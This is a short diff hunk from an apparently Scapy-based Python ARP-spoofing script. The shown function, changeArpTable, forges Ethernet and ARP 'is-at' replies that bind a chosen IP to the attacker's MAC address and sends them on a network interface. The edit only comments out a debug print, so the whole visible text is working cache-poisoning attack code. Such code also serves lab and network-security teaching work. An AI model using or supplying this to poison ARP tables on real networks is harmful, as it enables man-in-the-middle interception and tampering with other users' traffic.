@@ -10,5 +10,5 @@ def getTargetMac(target : str , interface : str )->str : #get mac from ip
 def changeArpTable( targetIp : str , targetMac : str, src :str , srcMac : str ,interface : str )->None: #change arp tables if the ip we want to pretend to is already in the table 
     etherAttack = Ether(dst = targetMac, src = srcMac)
     arpAttack = ARP(pdst = targetIp, hwdst = targetMac, psrc = src, op = "is-at" )
-    (etherAttack/arpAttack).show()
+    #(etherAttack/arpAttack).show()
     sendp(etherAttack/arpAttack , iface=interface,verbose=False)
